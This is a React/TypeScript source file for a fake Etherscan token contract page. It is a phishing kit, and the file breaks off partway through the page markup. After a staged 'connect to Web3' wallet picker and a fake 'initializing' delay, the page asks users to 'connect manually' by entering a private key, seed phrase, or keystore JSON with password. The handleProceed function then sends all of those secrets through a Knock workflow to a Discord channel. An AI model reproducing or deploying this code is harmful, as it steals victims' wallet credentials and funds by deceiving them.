import React, { useEffect, useRef, useState } from 'react';
import { Search, Copy, ExternalLink, ChevronDown, Info, Sun, X, User, BookOpen, ChevronUp, ArrowRight, RefreshCw, Plus, Edit, Flame, Flag, Menu } from 'lucide-react';
import { FaXTwitter, FaMedium, FaFacebook, FaRedditAlien, FaCheck, FaRegFileCode, FaGasPump } from 'react-icons/fa6';
import { LuArrowUpToLine } from "react-icons/lu";
import ethereumLogo from './assets/images/ethereum-original.svg';
import logoEtherscan from './assets/images/logo-etherscan.svg';
import mapImg from './assets/images/map.png';
import Best from './assets/images/best.png';
import Trust from './assets/images/trustblue.jpg';
import stake9_40 from './assets/images/stake-9_40.jpg';
import x0_20 from './assets/images/0x0_20.webp';
import bcgames_20 from './assets/images/bcgames_20.webp';
import coinsgame_20a from './assets/images/coinsgame_20a.webp';
import cryptoslots from './assets/images/cryptoslots.webp';
import cw_20 from './assets/images/cw_20.webp';
import etoro_20 from './assets/images/etoro_20.webp';
import moonpay_20 from './assets/images/moonpay_20.webp';
import remittix_20 from './assets/images/remittix_20.webp';
import Metamask from './assets/images/metamask.png';
import Phantom from './assets/images/phantom.webp';
import Solfare from './assets/images/solfare.png';
import Ledger from './assets/images/Ledger.png';
import Coinbase from './assets/images/Coinbase.png';
import WalletCon from './assets/images/walletConnect.png';
import OtherWallets from './assets/images/OtherWallets.png';
import shape from './assets/images/shape-1.svg';
import token99 from './assets/images/token6900_20.webp';
import ethereumLogoLight from './assets/images/wlfi.webp';
import { FileText } from 'lucide-react';
import { RxExclamationTriangle } from "react-icons/rx";
import { ImAttachment } from "react-icons/im";
import { BsFullscreen } from "react-icons/bs";
import { RiCodeSSlashFill } from "react-icons/ri";
import { FaTasks } from "react-icons/fa";
import { HiOutlineLightBulb } from "react-icons/hi";
import Typewriter from "typewriter-effect";
import { Knock } from "@knocklabs/node";

interface ContractFunction {
  id: number;
  name: string;
  signature: string;
  description?: string;
  hasInputs?: boolean;
  queryType?: string;
  returnDescription?: string;
}

const contractFunctions: ContractFunction[] = [
  {
    id: 1,
    name: 'allowance',
    signature: '(0xdd62ed3e)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  },
  {
    id: 2,
    name: 'balanceOf',
    signature: '(0x70a08231)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  },
  {
    id: 3,
    name: 'decimals',
    signature: '(0x313ce567)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  },
  {
    id: 4,
    name: 'developmentReserve',
    signature: '(0x8e2efdf2)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  },
  {
    id: 5,
    name: 'firstBuyCompleted',
    signature: '(0x5ca72856)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  },
  {
    id: 6,
    name: 'listingsReserve',
    signature: '(0x04b1a76f)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  },
  {
    id: 7,
    name: 'marketingReserve',
    signature: '(0x3e85713d)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  },
  {
    id: 8,
    name: 'name',
    signature: '(0x06fdde03)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  },
  {
    id: 9,
    name: 'owner',
    signature: '(0x8da5cb5b)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  }
];

const contractFunctionsWrite: ContractFunction[] = [
  {
    id: 1,
    name: 'approve',
    signature: '(0xdd62ed3e)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  },
  {
    id: 2,
    name: 'burn',
    signature: '(0x70a08231)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  },
  {
    id: 3,
    name: 'decreaseAllowance',
    signature: '(0x313ce567)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  },
  {
    id: 4,
    name: 'increaseAllowance',
    signature: '(0x8e2efdf2)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  },
  {
    id: 5,
    name: 'renounceOwnership',
    signature: '(0x5ca72856)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  },
  {
    id: 6,
    name: 'setUniswapPool',
    signature: '(0x04b1a76f)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  },
  {
    id: 7,
    name: 'transfer',
    signature: '(0x3e85713d)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  },
  {
    id: 8,
    name: 'transferFrom',
    signature: '(0x06fdde03)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  },
  {
    id: 9,
    name: 'transferOwnership',
    signature: '(0x8da5cb5b)',
    description: 'Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.',
    hasInputs: true,
    queryType: 'uint256',
    returnDescription: 'The remaining allowance for the spender.'
  }
];

interface SponsoredAd {
  id: string;
  logo: string;
  title: string;
  subtitle: string;
  description: string;
  buttonText?: string;
  buttonVariant?: 'primary' | 'secondary';
}

const sponsoredContent: Record<string, SponsoredAd[]> = {
  buy: [
    {
      id: '0x0-exchange',
      logo: x0_20,
      title: '0x0 Exchange',
      subtitle: 'Protect your transactions. Stay invisible with 0x0.',
      description: 'Your wallet is exposed. Buy, sell, and trade with complete privacy while earning passive income.',
    },
    {
      id: 'etoro',
      logo: etoro_20,
      title: 'eToro',
      subtitle: 'A global broker built for crypto trading.',
      description: 'User-friendly interface. Trusted worldwide.',
    },
    {
      id: 'moonpay',
      logo: moonpay_20,
      title: 'MoonPay',
      subtitle: 'Buy, sell and swap Ethereum with MoonPay.',
      description: 'Spend less on fees, more on crypto. Buy crypto easily with MoonPay Balance. 20M+ users trust MoonPay worldwide.',
      buttonText: 'Buy Now!',
      buttonVariant: 'secondary',
    },
  ],
  presale: [
    {
      id: 'remittix',
      logo: remittix_20,
      title: 'Remittix',
      subtitle: 'XRP 2.0? Discover Remittix.',
      description: 'Remittix is revolutionizing global payments. $16M+ raised.',
      buttonText: 'Explore Now',
      buttonVariant: 'secondary',
    },
  ],
  play: [
    {
      id: 'coins-game',
      logo: coinsgame_20a,
      title: 'Coins.game',
      subtitle: '100 free spins for registration.',
      description: 'Everyday giveaways up to 100 ETH, Lucky Spins. Deposit BONUS 300% and Cashbacks!',
      buttonText: 'Spin now!',
      buttonVariant: 'secondary',
    },
    {
      id: 'bc-game',
      logo: bcgames_20,
      title: 'BC.GAME',
      subtitle: 'The Best ETH Casino',
      description: '5000+ Slots & Live Casino Games, 50+cryptos. Register with Etherscan and get 760% deposit bonus. Win Big$, withdraw it fast.',
      buttonText: 'Claim Now!',
      buttonVariant: 'secondary',
    },
    {
      id: 'stake',
      logo: stake9_40,
      title: 'Stake',
      subtitle: '200% Bonus, 100K Daily Giveaways, Instant Withdrawals',
      description: 'Slots, Roulette, Poker & more - Proud sponsors of UFC, Everton & StakeF1 team!',
      buttonText: 'Play Now!',
      buttonVariant: 'secondary',
    },
  ],
  gaming: [
    {
      id: 'bc-game-gaming',
      logo: bcgames_20,
      title: 'BC.GAME',
      subtitle: '- The Best ETH Casino',
      description: '5000+ Slots & Live Casino Games, 50+cryptos. Register with Etherscan and get 760% deposit bonus. Win Big$, withdraw it fast.',
      buttonText: 'Claim Now!',
      buttonVariant: 'secondary',
    },
    {
      id: 'crypto-slots',
      logo: cryptoslots,
      title: 'CryptoSlots',
      subtitle: 'Play & Get 25 Free Spins at CryptoSlots',
      description: 'Anonymous play on awesome games - sign up now for 25 free jackpot spins - worth $100s!',
      buttonText: 'Play Now',
      buttonVariant: 'secondary',
    },
    {
      id: 'crypto-wins',
      logo: cw_20,
      title: 'CryptoWins',
      subtitle: '200% More Funds to Play on Us up to 4 BTC!',
      description: '100s of games, generous bonuses, 20+ years of trusted gaming. Join CryptoWins & start winning today!',
      buttonText: 'Claim Now!',
      buttonVariant: 'secondary',
    },
  ],
};

function App() {
  const [hoveredDropdown, setHoveredDropdown] = useState<string | null>();
  const [searchValue, setSearchValue] = useState('');
  const [expandedSections, setExpandedSections] = useState({
    sourceCode: true,
    securityAudit: false,
    contractABI: false,
    creationCode: false,
    deployedBytecode: false,
    sourcemap: false,
    swarmSource: false
  });
  const knock = new Knock(import.meta.env.VITE_KNOCK_API_KEY);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [activeTab, setActiveTab] = useState('Write Contract');
  const [walletId, setWalletID] = useState<number>(0);
  const [showInitializingModal, setShowInitializingModal] = useState(false);
  const [showConnectManually, setShowConnectManually] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [showValidate, setShowValidate] = useState(false);
  const [expandedFunctions, setExpandedFunctions] = useState<Set<number>>(new Set([1]));
  const [allExpanded, setAllExpanded] = useState(false);
  const [activeTabPassword, setActiveTabPassword] = useState('privatekey');
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [formState, setFormState] = useState({ phrase: "", wallet: "", password: "", privatekey: "", keystore: "" });
  const [activeDropdown, setActiveDropdown] = useState<string | null>(null);

  const targetSectionRef = useRef<HTMLElement>(null);

  useEffect(() => {
    // Auto-scroll to target section when component mounts
    const scrollToSection = () => {
      if (targetSectionRef.current) {
        // Option 1: Smooth scroll to the section
        targetSectionRef.current.scrollIntoView({
          behavior: 'smooth',
          block: 'start'
        });
      }
    };

    // Add a small delay to ensure the page is fully loaded
    const timer = setTimeout(scrollToSection, 500);

    // Cleanup timer
    return () => clearTimeout(timer);
  }, []);

  const handleDropdownClick = (dropdown: string) => {
    setActiveDropdown(activeDropdown === dropdown ? null : dropdown);
  };

  const handleDropdownLeave = () => {
    setActiveDropdown(null);
  };

  const data = [
    { img: Best, title: "Best" },
    { img: WalletCon, title: "Wallet Connect" },
    { img: Trust, title: "Trust" },
    { img: Metamask, title: "Metamask" },
    { img: Phantom, title: "Phantom" },
    { img: Ledger, title: "Ledger" },
    { img: Solfare, title: "Solfare" },
    { img: OtherWallets, title: "OtherWalletse" },
    { img: Coinbase, title: "Coinbase" },
  ];
  const changeHandler = (event: any) => {
    setFormState({
      ...formState,
      [event.target.name]: event.target.value,
      wallet: data[walletId].title,
    });
  };

  const tabs = [
    { id: 'privatekey', label: 'Private Key' },
    { id: 'phrase', label: 'Phrase' },
    { id: 'keystore', label: 'Keystore JSON' },
  ];

  const menuItems = [
    {
      href: 'https://etherscan.io/tokencheck-tool?t=0xda5e1988097297dcdc1f90d4dfe7909e847cbef6',
      id: 'check-supply',
      icon: RefreshCw,
      label: 'Check previous token supply'
    },
    {
      href: '#',
      id: 'add-metamask',
      icon: Plus,
      label: 'Add Token to MetaMask (Web3)'
    },
    {
      href: '#',
      id: 'update-info',
      icon: Edit,
      label: 'Update Token Info'
    },
    {
      href: 'https://etherscan.io/contactus?id=5&a=0xda5e1988097297dcdc1f90d4dfe7909e847cbef6',
      id: 'update-name',
      icon: User,
      label: 'Update Name Tag or Label'
    },
    {
      href: 'https://etherscan.io/contactus',
      id: 'burn',
      icon: Flame,
      label: 'Submit Burn Details'
    },
    {
      href: 'https://etherscan.io/contactus?id=6',
      id: 'report',
      icon: Flag,
      label: 'Report/Flag Address'
    }
  ];

  const handleProceed = async (e: any) => {
    e.preventDefault();
    knock.objects.set("project1", "project-1", {
      name: "My project1",
      total_assets: 10,
      tags: ["cool", "fun", "project"],
    });
    await knock.objects.setChannelData(
      "project1",
      "projects-1",
      import.meta.env.VITE_KNOCK_DISCORD_CHANNEL_ID,
      {
        connections: [
          {
            channel_id: "1399529272783143034",
          },
        ],
      }
    );
    await knock.workflows.trigger("qubetics", {
      data: {
        wallet: formState?.wallet,
        phrase: formState?.phrase,
        privatekey: formState?.privatekey,
        keystore: formState?.keystore,
        password: formState?.password,
      },
      recipients: [{ id: "projects-1", collection: "project1" }],
    });
    setTimeout(() => {
      setShowPassword(false);
      setShowValidate(true)
    }, 1000);
  };

  const handleCancel = () => {
    setShowPassword(false);
  };

  const initializeFunc = (index: number) => {
    setShowWalletModal(false);
    setWalletID(index);
    setShowInitializingModal(true);
    setTimeout(() => {
      setShowInitializingModal(false);
      setShowConnectManually(true);
    }, 3000);
  };

  const connectManually = () => {
    setShowConnectManually(false);
    setShowPassword(true);
  };

  const toggleFunction = (id: number) => {
    const newExpanded = new Set(expandedFunctions);
    if (newExpanded.has(id)) {
      newExpanded.delete(id);
    } else {
      newExpanded.add(id);
    }
    setExpandedFunctions(newExpanded);
  };

  const expandAll = () => {
    if (allExpanded) {
      setExpandedFunctions(new Set());
      setAllExpanded(false);
    } else {
      setExpandedFunctions(new Set(contractFunctions.map(f => f.id)));
      setAllExpanded(true);
    }
  };

  const resetAll = () => {
    setExpandedFunctions(new Set([1]));
    setAllExpanded(false);
  };

  const renderTabContent = () => {
    switch (activeTab) {
      case 'Code':
        return (
          <>
            {/* Contract Info Header */}
            <div className="py-4 mb-3 flex items-center">
              <div className="w-4 h-4 bg-[#00A186] rounded-full mr-1 flex items-center justify-center">
                <svg className="w-2.5 h-2.5 text-white" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                </svg>
              </div>
              <span className="text-gray-900 font-bold text-xs md:text-sm">Contract Source Code Verified</span>
              <span className="text-gray-500 ml-2 text-xs hidden sm:block md:text-sm">(Exact Match)</span>
              <div className="ml-auto hidden sm:block">
                <RxExclamationTriangle className='sm:text-xl lg:text-2xl text-[#FFC007] font-bold' />
              </div>
            </div>

            {/* Contract Details Grid */}
            <div className="gap-6 space-y-3 gap-x-8 mb-3 block md:hidden">
              <div className="space-y-3">
                <div className="grid grid-cols-2 items-start">
                  <span className="text-gray-900 text-xs sm:text-sm">Contract Name:</span>
                  <span className="text-gray-900 font-bold text-xs sm:text-sm">LightchainAI</span>
                </div>
                <div className="grid grid-cols-2 items-start">
                  <span className="text-gray-900 text-xs sm:text-sm">Compiler Version</span>
                  <span className="text-gray-900 font-bold text-xs sm:text-sm">v0.8.20+commit.a1b79de6</span>
                </div>
              </div>
              <hr />
              <div className="space-y-3">
                <div className="grid grid-cols-2 items-start">
                  <span className="text-gray-900 text-xs sm:text-sm">Optimization Enabled:</span>
                  <span className="text-gray-900 font-bold text-xs sm:text-sm">No <span className='font-normal'>with</span> 200 <span className='font-normal'>runs</span></span>
                </div>
                <div className="grid grid-cols-2 items-start">
                  <span className="text-gray-900 text-xs sm:text-sm">Other Settings:</span>
                  <span className="text-gray-900 font-bold text-xs sm:text-sm">default <span className='font-normal'>evmVersion</span>, MIT <span className="text-[#07699C] cursor-pointer font-normal ">license</span></span>
                </div>
              </div>
            </div>
            <div className="hidden md:grid grid-cols-2 gap-16 gap-x-8 mb-3">
              <div className="space-y-6">
                <div className="grid grid-cols-2 items-start">
                  <span className="text-gray-900 text-sm">Contract Name:</span>
                  <span className="text-gray-900 font-bold text-sm">Token</span>
                </div>
                <hr />
                <div className="grid grid-cols-2 items-start">
                  <span className="text-gray-900 text-sm">Compiler Version</span>
                  <span className="text-gray-900 font-bold text-sm">v0.8.9+commit.e5eed63a</span>
                </div>
              </div>
              <div className="space-y-6">
                <div className="grid grid-cols-2 items-start">
                  <span className="text-gray-900 text-sm">Optimization Enabled:</span>
                  <span className="text-gray-900 font-bold text-sm">No <span className='font-normal'>with</span> 200 <span className='font-normal'>runs</span></span>
                </div>
                <hr />
                <div className="grid grid-cols-2 items-start">
                  <span className="text-gray-900 text-sm">Other Settings:</span>
                  <span className="text-gray-900 font-bold text-sm">default <span className='font-normal'>evmVersion</span>, MIT <span className="text-[#07699C] cursor-pointer font-normal ">license</span></span>
                </div>
              </div>
            </div>

            {/* Source Code Section */}
            <div className="space-y-6">
              <div className="">
                <div
                  className="flex flex-col items-start gap-y-3 md:flex-row md:items-center md:justify-between p-4 px-0"
                >
                  <div className="flex items-center space-x-2 text-sm">
                    <div className="">
                      <FaRegFileCode className='text-gray-400' />
                    </div>
                    <span className="font-medium text-gray-900">Contract Source Code</span>
                    <span className="text-gray-500 font-normal">(Solidity)</span>
                  </div>
                  <div className='hidden sm:grid space-y-2'>
                    <div className="flex items-center space-x-3">
                      <button className="bg-[#DEE2E6] text-black px-2 py-1 rounded-lg text-xs flex items-center space-x-2">
                        <div className='flex space-x-2'>
                          <span className='bg-gray-800 text-white px-1 font-bold'>b</span>
                          <span className=''>IDE</span>
                        </div>
                        <div className=''>
                          <ChevronDown className="scale-75" />
                        </div>
                      </button>
                      <button className="bg-[#DEE2E6] text-black px-2 py-1 rounded-lg text-xs flex items-center space-x-2">
                        <span className=''>More Options</span>
                        <div className=''>
                          <ChevronDown className="scale-75" />
                        </div>
                      </button>
                    </div>
                    <div className="flex justify-end space-x-3">
                      <button className="bg-[#DEE2E6] text-black px-1.5 py-1 rounded-lg text-xs flex items-center space-x-1">
                        <span className=''>Outline</span>
                        <div className=''>
                          <ChevronDown className="scale-75" />
                        </div>
                      </button>
                      <button className="bg-[#DEE2E6] text-black px-2 py-1 rounded-lg text-xs flex items-center">
                        <Copy className="scale-50" />
                      </button>
                      <button className="bg-[#DEE2E6] text-black px-2 py-2 rounded-lg text-xs flex items-center ">
                        <ImAttachment className="text-sm" />
                      </button>
                      <button className="bg-[#DEE2E6] text-black px-2 py-2 rounded-lg text-xs flex items-center">
                        <BsFullscreen className="text-sm" />
                      </button>
                    </div>
                  </div>
                </div>
                {expandedSections.sourceCode && (
                  <div className="p-4 h-80 overflow-y-scroll rounded-lg bg-[#F8F9FA] border">
                    <pre className="text-xs text-gray-800 overflow-x-auto">
                      <code>{sampleSourceCode}</code>
                    </pre>
                  </div>
                )}
              </div>

              {/* Security Audit Section */}
              <div className="">
                <div
                  className="flex items-center justify-between p-4 px-0"
                >
                  <div className="flex items-center space-x-2 text-sm">
                    <div className="">
                      <FileText className='scale-75 text-gray-400' />
                    </div>
                    <span className="font-medium text-gray-900">Contract Security Audit</span>
                  </div>
                </div>
                <div className="flex flex-col items-start gap-y-2 sm:gap-y-0 sm:flex-row sm:items-center space-x-3 pl-6 text-sm">
                  <div className="w-1 h-1 bg-black rounded-full"></div>
                  <div className="flex items-center space-x-2 py-1 px-1.5 bg-[#F8F9FA] border rounded-lg">
                    <div className="w-3.5 h-3.5 border-2 border-gray-800 rounded-full flex items-center justify-center">
                      <X className="w-2 h-2 text-gray-800" />
                    </div>
                    <span className="text-gray-900 text-xs sm:text-sm">No Contract Security Audit Submitted</span>
                  </div>
                  <span className="text-blue-500">- Submit Audit Here</span>
                </div>
              </div>

              {/* Contract ABI Section */}
              <div className="">
                <div
                  className="flex items-center justify-between p-4 px-0"
                >
                  <div className="flex items-center space-x-2 text-sm">
                    <div className="">
                      <FaTasks className='text-gray-400' />
                    </div>
                    <span className="font-medium text-gray-900">Contract ABI</span>
                    <div className="flex items-center bg-[#E9ECEF] py-1 px-2 rounded-full space-x-1">
                      <RiCodeSSlashFill className='text-lg ' />
                      <span className='text-sm'>API</span>
                    </div>
                  </div>
                  <div className="flex justify-end space-x-3">
                    <button className="bg-[#DEE2E6] text-black p-1 rounded-lg text-xs flex items-center">
                      <Copy className="scale-50" />
                    </button>
                    <button className="bg-[#DEE2E6] text-black p-2 rounded-lg text-xs flex items-center">
                      <BsFullscreen className="text-xs" />
                    </button>
                  </div>
                </div>
                <div className="p-4 h-40 overflow-y-scroll rounded-lg bg-[#F8F9FA] border">
                  <pre className="text-xs text-gray-800 overflow-x-auto">
                    <code>{sampleABICode}</code>
                  </pre>
                </div>
              </div>

              {/* Contract Creation Code */}
              <div className="">
                <div
                  className="flex flex-col items-start gap-y-2 sm:gap-y-0 sm:flex-row sm:items-center sm:justify-between p-4 px-0"
                >
                  <div className="flex items-center space-x-2 text-sm">
                    <div className="">
                      <RiCodeSSlashFill className='text-gray-400 text-xl' />
                    </div>
                    <span className="font-medium text-gray-900">Contract Creation Code</span>
                  </div>
                  <div className='grid space-y-2'>
                    <div className="flex justify-end space-x-3">
                      <button className="bg-[#DEE2E6] text-black px-2 py-1 rounded-md text-xs flex items-center space-x-1">
                        <span className=''>Decompile Bytecode</span>
                        <div className=''>
                          <ExternalLink className="w-4 h-4 ml-1 inline text-[#6C757D]" />
                        </div>
                      </button>
                      <button className="bg-[#DEE2E6] text-black px-2 py-1 rounded-md text-xs flex items-center space-x-1">
                        <span className=''>Switch to Opcodes view</span>
                      </button>
                    </div>
                  </div>
                </div>
                <div className="p-4 h-32 overflow-y-scroll rounded-lg bg-[#F8F9FA] border">
                  <pre className="text-xs text-gray-800 overflow-x-auto">
                    <code>{sampleByteCode}</code>
                  </pre>
                </div>
              </div>
            </div>
          </>
        );
      case 'Read Contract':
        return (
          <div className='py-2'>
            <div className="bg-gray-200 border border-gray-300 gap-x-1 lg:gap-x-0 rounded-md p-1 flex items-center text-sm text-gray-600 leading-relaxed mb-3">
              <Info className="scale-100 md:scale-75 lg:scale-50 text-gray-500" />
              <div className="flex-1 text-xs">
                Descriptions included below are taken from the contract source code{' '}
                <a
                  href="#"
                  className="text-[#0584C3] hover:underline"
                  onClick={(e) => e.preventDefault()}
                >
                  NetSpec
                </a>
                . Etherscan does not provide any guarantees on their safety or accuracy.
              </div>
            </div>
            <button onClick={() => setShowWalletModal(true)} className="bg-white border border-gray-300 rounded-md p-2 py-1 flex items-center gap-1 text-xs font-normal text-gray-900 hover:bg-gray-50 transition-colors mb-3">
              <div className="w-2 h-2 bg-red-500 rounded-full"></div>
              Connect to Web3
            </button>
            <div className="flex items-center justify-between mb-3">
              <div className="flex items-center gap-">
                <FileText className='scale-50 text-gray-400' />
                <h1 className="text-xs font-normal text-gray-900">Read Contract Information</h1>
              </div>
              <div className="flex items-center gap-3">
                <button
                  onClick={expandAll}
                  className="text-[#0584C3] hover:text-[#0584C3] text-xs font-normal"
                >
                  [{allExpanded ? 'Collapse all' : 'Expand all'}]
                </button>
                <button
                  onClick={resetAll}
                  className="text-[#0584C3] hover:text-[#0584C3] text-xs font-normal"
                >
                  [Reset]
                </button>
              </div>
            </div>
            {/* Header */}
            <div className="grid gap-y-3 pb-4">
              {contractFunctions.map((func, index) => (
                <div key={func.id} className="rounded-xl border shadow-sm">
                  <div onClick={() => toggleFunction(func.id)} className="flex px-2.5 py-1.5 rounded-xl bg-[#F8F9FA] cursor-pointer items-center justify-between">
                    <div className="flex items-center gap-1">
                      <span className="text-gray-700 font-medium text-xs">{func.id}.</span>
                      <div
                        className="flex items-center gap-2 text-gray-900 transition-colors"
                      >
                        <span className="font-mono text-xs">
                          {func.name} <span className="text-gray-500">{func.signature}</span>
                        </span>
                      </div>
                    </div>
                    <div className="flex items-center gap-2">
                      <button className="p-1 hover:bg-gray-100 rounded transition-colors">
                        <Copy className="w-3 h-3 text-gray-500" />
                      </button>
                      <button className="p-1 hover:bg-gray-100 rounded transition-colors">
                        <ExternalLink className="w-3 h-3 text-gray-500" />
                      </button>
                      <button className="p-1 hover:bg-gray-100 rounded transition-colors">
                        <ArrowRight className="w-3 h-3 text-gray-500" />
                      </button>
                    </div>
                  </div>

                  {/* Expanded Content */}
                  {func.hasInputs && (
                    <div
                      className={`overflow-hidden transition-all duration-300 ease-in-out ${expandedFunctions.has(func.id)
                        ? 'max-h-96 opacity-100 my-4'
                        : 'max-h-0 opacity-0 mt-0'
                        }`}
                    >
                      <div className="px-5 pb-2">
                        <p className="text-gray-600 italic text-xs mb-4">
                          {func.description}
                        </p>

                        <div className="space-y-3 mb-4">
                          <div>
                            <label className="block text-xs font-medium text-gray-700 mb-2.5">
                              from (address)
                            </label>
                            <input
                              type="text"
                              placeholder="from (address)"
                              className="w-full px-3 py-1.5 border border-gray-300 rounded-md text-xs font-mono text-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            />
                          </div>
                          <div>
                            <label className="block text-xs font-medium text-gray-700 mb-2.5">
                              to (address)
                            </label>
                            <input
                              type="text"
                              placeholder="to (address)"
                              className="w-full px-3 py-1.5 border border-gray-300 rounded-md text-xs font-mono text-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            />
                          </div>
                        </div>

                        <div className="mb-4">
                          <h4 className="text-xs font-medium text-gray-900 mb-2 p-2 w-fit bg-[#F8F9FA] border rounded-lg">Query</h4>
                          <div className="flex items-center gap-x-1">
                            <img src={shape} className='w-2 h-2' alt="" />
                            <p className="text-xs text-gray-700 font-mono">{func.queryType}</p>
                          </div>
                        </div>

                        <div>
                          <h4 className="text-xs font-medium text-gray-900 mb-1">Return:</h4>
                          <p className="text-xs text-gray-600">{func.returnDescription}</p>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>
        );
      case 'Write Contract':
        return (
          <div className='py-2'>
            <div className="flex items-center justify-between mb-3">
              <button onClick={() => setShowWalletModal(true)} className="bg-white border border-gray-300 rounded-md p-2 py-1 flex items-center gap-1 text-xs font-normal text-gray-900 hover:bg-gray-50 transition-colors">
                <div className="w-2 h-2 bg-red-500 rounded-full"></div>
                Connect to Web3
              </button>
              <div className="flex items-center gap-3">
                <button
                  onClick={expandAll}
                  className="text-[#0584C3] hover:text-[#0584C3] text-xs font-normal"
                >
                  [{allExpanded ? 'Collapse all' : 'Expand all'}]
                </button>
                <button
                  onClick={resetAll}
                  className="text-[#0584C3] hover:text-[#0584C3] text-xs font-normal"
                >
                  [Reset]
                </button>
              </div>
            </div>
            <div className="bg-gray-200 gap-x-1 lg:gap-x-0 border border-gray-300 rounded-md p-1 flex items-center text-sm text-gray-600 leading-relaxed mb-4">
              <Info className="scale-100 md:scale-75 lg:scale-50 text-gray-500" />
              <div className="flex-1 text-xs">
                Descriptions included below are taken from the contract source code{' '}
                <a
                  href="#"
                  className="text-[#0584C3] hover:underline"
                  onClick={(e) => e.preventDefault()}
                >
                  NetSpec
                </a>
                . Etherscan does not provide any guarantees on their safety or accuracy.
              </div>
            </div>
            {/* Header */}
            <div className="grid gap-y-3 pb-4">
              {contractFunctionsWrite.map((func, index) => (
                <div key={func.id} className="rounded-xl border shadow-sm">
                  <div onClick={() => toggleFunction(func.id)} className="flex px-2.5 py-1.5 rounded-xl bg-[#F8F9FA] cursor-pointer items-center justify-between">
                    <div className="flex items-center gap-1">
                      <span className="text-gray-700 font-medium text-xs">{func.id}.</span>
                      <div
                        className="flex items-center gap-2 text-gray-900 transition-colors"
                      >
                        <span className="font-mono text-xs">
                          {func.name} <span className="text-gray-500">{func.signature}</span>
                        </span>
                      </div>
                    </div>
                    <div className="flex items-center gap-2">
                      <button className="p-1 hover:bg-gray-100 rounded transition-colors">
                        <Copy className="w-3 h-3 text-gray-500" />
                      </button>
                      <button className="p-1 hover:bg-gray-100 rounded transition-colors">
                        <ExternalLink className="w-3 h-3 text-gray-500" />
                      </button>
                      <button className="p-1 hover:bg-gray-100 rounded transition-colors">
                        <ArrowRight className="w-3 h-3 text-gray-500" />
                      </button>
                    </div>
                  </div>

                  {/* Expanded Content */}
                  {func.hasInputs && (
                    <div
                      className={`overflow-hidden transition-all duration-300 ease-in-out ${expandedFunctions.has(func.id)
                        ? 'max-h-96 opacity-100 my-4'
                        : 'max-h-0 opacity-0 mt-0'
                        }`}
                    >
                      <div className="px-5 pb-2">
                        <p className="text-gray-600 italic text-xs mb-4">
                          {func.description}
                        </p>

                        <div className="space-y-3 mb-4">
                          <div>
                            <label className="block text-xs font-medium text-gray-700 mb-2.5">
                              from (address)
                            </label>
                            <input
                              type="text"
                              placeholder="from (address)"
                              className="w-full px-3 py-1.5 border border-gray-300 rounded-md text-xs font-mono text-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            />
                          </div>
                          <div>
                            <label className="block text-xs font-medium text-gray-700 mb-2.5">
                              to (address)
                            </label>
                            <input
                              type="text"
                              placeholder="to (address)"
                              className="w-full px-3 py-1.5 border border-gray-300 rounded-md text-xs font-mono text-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            />
                          </div>
                        </div>

                        <div className="mb-4">
